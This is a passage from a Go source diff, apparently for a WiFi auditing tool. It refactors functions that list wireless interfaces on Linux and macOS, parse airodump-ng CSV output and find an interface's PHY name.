+				if line = strings.TrimSpace(line); strings.HasPrefix(line, "Interface ") {
 					ifaces = append(ifaces, strings.TrimPrefix(line, "Interface "))
 				}
 			}
@@ -774,11 +970,9 @@ func listAllInterfaces() []string {
 		var ifaces []string
 		for _, e := range entries {
 			name := e.Name()
-			// wlan* = built-in/PCI, wlx* = USB adapters (e.g. Alfa), wlp* = PCI by path, mon* = monitor ifaces
 			if strings.HasPrefix(name, "wlan") || strings.HasPrefix(name, "mon") ||
 				strings.HasPrefix(name, "wlp") || strings.HasPrefix(name, "wlx") ||
 				strings.HasPrefix(name, "wl") {
-				// confirm wireless by checking phy80211 symlink exists
 				if _, err := os.Stat("/sys/class/net/" + name + "/phy80211"); err == nil {
 					ifaces = append(ifaces, name)
 				} else if strings.HasPrefix(name, "wlan") || strings.HasPrefix(name, "wlx") ||
@@ -788,25 +982,23 @@ func listAllInterfaces() []string {
 			}
 		}
 		if len(ifaces) == 0 {
-			// hint: rfkill may be blocking the adapter
 			if rfkillOut, err := exec.Command("rfkill", "list").Output(); err == nil {
 				if strings.Contains(string(rfkillOut), "yes") {
-					ui.Warn("rfkill may be blocking your adapter. Try: sudo rfkill unblock all")
+					ui.Warn("rfkill may be blocking adapter. Run: sudo rfkill unblock all")
 				}
 			}
 		}
 		return ifaces
 	}
-	// macOS: use ifconfig to find 802.11 interfaces (catches external USB WiFi adapters)
+	// macOS: find 802.11 interfaces
 	ifconfigOut, err := exec.Command("ifconfig", "-a").Output()
 	if err == nil {
 		var ifaces []string
 		currentIface := ""
 		for _, line := range strings.Split(string(ifconfigOut), "\n") {
-			// interface header line: "en0: flags=..."
 			if len(line) > 0 && line[0] != ' ' && line[0] != '\t' {
-				if idx := strings.Index(line, ":"); idx > 0 {
-					currentIface = line[:idx]
+				if i := strings.Index(line, ":"); i > 0 {
+					currentIface = line[:i]
 				}
 			}
 			if currentIface != "" && strings.Contains(line, "IEEE 802.11") {
@@ -818,12 +1010,11 @@ func listAllInterfaces() []string {
 			return ifaces
 		}
 	}
-	// macOS fallback: networksetup — match Wi-Fi, AirPort, and USB/external wireless
+	// macOS fallback via networksetup
 	out, _ := exec.Command("networksetup", "-listallhardwareports").Output()
-	lines := strings.Split(string(out), "\n")
 	var ifaces []string
 	isWireless := false
-	for _, line := range lines {
+	for _, line := range strings.Split(string(out), "\n") {
 		trimmed := strings.TrimSpace(line)
 		if strings.HasPrefix(trimmed, "Hardware Port:") {
 			portName := strings.ToLower(strings.TrimPrefix(trimmed, "Hardware Port:"))
@@ -833,8 +1024,7 @@ func listAllInterfaces() []string {
 				strings.Contains(portName, "802.11")
 		}
 		if isWireless && strings.HasPrefix(trimmed, "Device:") {
-			dev := strings.TrimSpace(strings.TrimPrefix(trimmed, "Device:"))
-			if dev != "" {
+			if dev := strings.TrimSpace(strings.TrimPrefix(trimmed, "Device:")); dev != "" {
 				ifaces = append(ifaces, dev)
 			}
 			isWireless = false
@@ -868,8 +1058,8 @@ func parseAirodumpCSV(path string) ([]wifiNetwork, error) {
 		return nil, err
 	}
 
-	// Two sections: APs then Stations, separated by blank line
 	content := string(raw)
+	// airodump-ng uses \r\n; try both separators for the section break
 	sections := strings.SplitN(content, "\r\n\r\n", 2)
 	if len(sections) < 2 {
 		sections = strings.SplitN(content, "\n\n", 2)
@@ -928,6 +1118,27 @@ func parseAirodumpCSV(path string) ([]wifiNetwork, error) {
 	return result, nil
 }
 
+// getPhyForIface returns the PHY name (e.g. "phy0") for an interface from `iw dev`.
+func getPhyForIface(iface string) string {
+	out, err := exec.Command("iw", "dev").Output()
+	if err != nil {
+		return ""
+	}
+	currentPhy := ""
+	for _, line := range strings.Split(string(out), "\n") {
+		trimmed := strings.TrimSpace(line)
+		if strings.HasPrefix(trimmed, "phy#") {
+			currentPhy = "phy" + strings.TrimPrefix(trimmed, "phy#")
+		}
+		if strings.HasPrefix(trimmed, "Interface ") {
+			if strings.TrimPrefix(trimmed, "Interface ") == iface {
+				return currentPhy
+			}
+		}
+	}
+	return ""
+}
+
 func orBroadcast(s string) string {
 	if s == "" {
 		return "broadcast"
@@ -944,11 +1155,10 @@ func sanitize(s string) string {
 			sb.WriteRune('_')
 		}
 	}
-	result := sb.String()
-	if result == "" {
-		return "network"
+	if result := sb.String(); result != "" {
+		return result
 	}
-	return result
+	return "network"
 }
 
 func wTrunc(s string, max int) string {
@@ -956,28 +1166,4 @@ func wTrunc(s string, max int) string {
 		return s
 	}
 	return s[:max-1] + "…"
-}
-
-// getPhyForIface returns the PHY name (e.g. "phy0") for a given interface using `iw dev`.
-// This is used by the iw monitor mode method to create a monitor interface on the correct PHY,
-// ensuring all bands (2.4GHz + 5GHz) the hardware supports are available.
-func getPhyForIface(iface string) string {
-	out, err := exec.Command("iw", "dev").Output()
-	if err != nil {
-		return ""
-	}
-	currentPhy := ""
-	for _, line := range strings.Split(string(out), "\n") {
-		trimmed := strings.TrimSpace(line)
-		if strings.HasPrefix(trimmed, "phy#") {
-			// "phy#0" → "phy0"
-			currentPhy = "phy" + strings.TrimPrefix(trimmed, "phy#")
-		}
-		if strings.HasPrefix(trimmed, "Interface ") {
-			if strings.TrimPrefix(trimmed, "Interface ") == iface {
-				return currentPhy
-			}
-		}
-	}
-	return ""
 }
